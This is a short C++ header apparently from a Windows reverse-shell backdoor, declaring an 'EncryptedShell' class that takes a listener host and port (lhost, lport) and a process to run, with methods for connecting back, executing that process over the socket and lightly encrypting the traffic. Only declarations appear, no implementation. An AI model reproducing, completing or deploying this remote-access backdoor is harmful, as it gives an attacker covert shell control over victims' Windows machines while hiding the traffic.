#pragma once
#include "socket_winbd.h"
#include <iostream>
#include <sstream>
#include <openssl/ssl.h>
#include <stdlib.h>
#include <string>
#include <vector>
#include <namedpipeapi.h>

#pragma warning(disable : 4996)

using namespace std;

class EncryptedShell
{
public:
	EncryptedShell();
	EncryptedShell(std::string lhost, int lport, short family, char* process);
	void exec();
	string encrypt_string(vector<char> vt,int key);
	string decrypt_string(vector<char> dec, int key);
	int convert_char_to_ascii(char charactere);
	char convert_ascii_to_char(char ascii_value);
private:
	SOCKET init_socket();
	sockaddr_in s_setting();
	void execute_encrypted_process(SOCKET s,char *process);
	void reverse_s(SOCKET socks, struct sockaddr_in s);
	std::string lhost;
	int lport;
	int family;
	char* process;
};